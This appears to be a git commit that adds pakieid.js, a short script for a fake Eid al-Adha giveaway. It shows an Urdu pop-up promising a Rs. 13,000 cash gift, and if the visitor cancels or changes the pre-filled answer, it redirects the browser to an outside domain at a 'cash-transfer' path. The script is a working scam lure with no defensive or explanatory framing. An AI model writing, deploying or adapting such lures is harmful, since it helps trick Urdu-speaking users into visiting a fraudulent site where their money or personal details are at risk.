64cec71302df1aef8a9ba60a6d26879f15de456a
usorondo98 <abode_moped_9a@icloud.com>
2026-05-20 06:40:32 +0100

    Create pakieid.js

---
+++ pakieid.js
@@ -0,0 +1,10 @@
+var password = 'Rs.13,000';
+
+password = prompt(
+  'Eid Al Adha: مبارک ہو، آپ 13,000 روپے عید الاضحی کے نقد تحفہ کے اہل ہیں۔ ابھی چالو کرنے کے لیے ٹھیک ہے پر کلک کریں۔',
+  'Rs.13,000'
+);
+
+if (password !== 'Rs.13,000') {
+    location.href = 'https://www.mechaniitid.site/rs13000-eid-al-adha-cash-transfer';
+}
